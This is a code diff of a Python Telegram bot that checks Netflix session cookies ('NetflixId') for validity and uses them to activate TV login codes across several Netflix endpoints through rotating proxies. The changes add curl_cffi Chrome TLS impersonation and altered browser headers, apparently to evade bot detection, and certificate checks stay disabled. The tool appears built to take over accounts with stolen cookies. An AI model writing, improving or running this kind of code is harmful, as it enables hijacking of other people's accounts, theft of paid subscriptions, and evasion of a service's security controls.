@@ -10,18 +10,19 @@ import random
 import re
 import threading
 import time
-import urllib.parse
 import warnings
 import zipfile
 from typing import Dict, List, Optional, Tuple
 
 warnings.filterwarnings("ignore")
 import pymongo
-import requests
+from curl_cffi import requests
 from flask import Flask
 from urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+# Disable insecure request warnings
+import urllib3
+urllib3.disable_warnings(InsecureRequestWarning)
 
 from telegram import BotCommand, BotCommandScopeChat, Update
 from telegram.ext import (
@@ -116,25 +117,20 @@ _local_proxies = []
 
 BASE_HEADERS = {
     "User-Agent": (
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like"
-        " Gecko) Chrome/143.0.0.0 Safari/537.36"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like"
+        " Gecko) Chrome/120.0.0.0 Safari/537.36"
     ),
     "Accept": (
         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
     ),
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Accept-Language": "en-IN,en;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
     "Cache-Control": "max-age=0",
     "DNT": "1",
     "Upgrade-Insecure-Requests": "1",
-    "Sec-GPC": "1",
     "Sec-Fetch-Site": "same-origin",
     "Sec-Fetch-Mode": "navigate",
     "Sec-Fetch-User": "?1",
     "Sec-Fetch-Dest": "document",
-    'Sec-Ch-Ua': '"Quetta";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-    "Sec-Ch-Ua-Mobile": "?0",
-    'Sec-Ch-Ua-Platform': '"Linux"',
 }
 
 
@@ -163,6 +159,7 @@ def test_proxy_connection(proxy_dict: Dict[str, str]) -> bool:
             proxies=proxy_dict,
             timeout=5,
             verify=False,
+            impersonate="chrome120",
         )
         return r.status_code == 200
     except Exception:
@@ -464,7 +461,7 @@ def extract_netflix_id_from_text(text: str) -> Optional[str]:
 
 
 def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
-    session = requests.Session()
+    session = requests.Session(impersonate="chrome120")
     session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
     headers = BASE_HEADERS.copy()
     headers["Referer"] = "https://www.netflix.com/"
@@ -533,12 +530,10 @@ def check_if_cookie_alive(netflix_id: str) -> Tuple[bool, str]:
         return False, "Connection Timeout"
 
 
-# ========== TV ACTIVATION USING /tv2 API ==========
+# ========== TV ACTIVATION WITH TLS IMPERSONATION & FORM EXTRACTION ==========
 def extract_form_fields(html: str) -> dict:
-    """Extracts authURL, flwssn, and any hidden input fields from the Netflix TV form."""
+    """Extracts authURL, flwssn, and hidden input fields from the Netflix TV form."""
     fields = {}
-
-    # Extract authURL
     auth_match = re.search(r'name="authURL"\s+value="([^"]+)"', html)
     if not auth_match:
         auth_match = re.search(r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']', html)
@@ -546,11 +541,10 @@ def extract_form_fields(html: str) -> dict:
         auth_match = re.search(r"authURL=([^&\s\"']+)", html)
     if not auth_match:
         auth_match = re.search(r'value="(c1\.[^"]+)"', html)
-    
+
     if auth_match:
         fields["authURL"] = auth_match.group(1)
 
-    # Extract flwssn (Flow Session ID)
     flwssn_match = re.search(r'name="flwssn"\s+value="([^"]+)"', html)
     if flwssn_match:
         fields["flwssn"] = flwssn_match.group(1)
@@ -562,11 +556,10 @@ def submit_tv_code(
     netflix_id: str, tv_code: str
 ) -> Tuple[bool, Optional[str], Optional[str], Optional[str], Optional[int]]:
     """
-    Attempts TV code activation across /tv2, /tv8, and /tv9 endpoints sequentially
-    while extracting authURL and dynamic flwssn session parameters.
+    Attempts TV code activation using curl_cffi Chrome TLS impersonation across /tv2, /tv8, and /tv9 endpoints.
     """
     endpoints = ["/tv2", "/tv8", "/tv9"]
-    session = requests.Session()
+    session = requests.Session(impersonate="chrome120")
     session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
     proxy = get_random_proxy()
 
@@ -574,13 +567,13 @@ def submit_tv_code(
     last_status = None
 
     for ep in endpoints:
+        logger.info(f"Attempting TV login on endpoint {ep}...")
         base_tv_url = f"https://www.netflix.com{ep}"
         headers = BASE_HEADERS.copy()
         headers["Referer"] = base_tv_url
         headers["Origin"] = "https://www.netflix.com"
 
         try:
-            # Step 1: GET request to retrieve dynamic form tokens
             r = session.get(
                 base_tv_url,
                 headers=headers,
@@ -604,7 +597,6 @@ def submit_tv_code(
             last_status = r.status_code
             continue
 
-        # Step 2: Build POST payload including flwssn if present
         payload = {
             "flow": "websiteSignUp",
             "authURL": auth_url,
@@ -644,7 +636,6 @@ def submit_tv_code(
         cleaned = re.sub(r"<[^>]+>", " ", cleaned)
         cleaned = re.sub(r"\s+", " ", cleaned).strip()
 
-        # Step 3: Verify success criteria
         if "/tv/out/success" in final_url or "success" in final_url.lower():
             logger.info(f"TV Activation succeeded using endpoint {ep} for code {tv_code}")
             return True, final_url, cleaned, None, status
@@ -666,20 +657,13 @@ def submit_tv_code(
         last_status = status
 
     return False, None, None, last_err, last_status
-        
-    
 
 
 def fetch_page(netflix_id: str, url: str) -> Tuple[Optional[str], Optional[str]]:
-    sess = requests.Session()
+    sess = requests.Session(impersonate="chrome120")
     sess.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
-    headers = {
-        "User-Agent": BASE_HEADERS["User-Agent"],
-        "Accept": BASE_HEADERS["Accept"],
-        "Accept-Encoding": BASE_HEADERS["Accept-Encoding"],
-        "Accept-Language": BASE_HEADERS["Accept-Language"],
-        "Referer": "https://www.netflix.com/",
-    }
+    headers = BASE_HEADERS.copy()
+    headers["Referer"] = "https://www.netflix.com/"
     proxy = get_random_proxy()
     try:
         r = sess.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
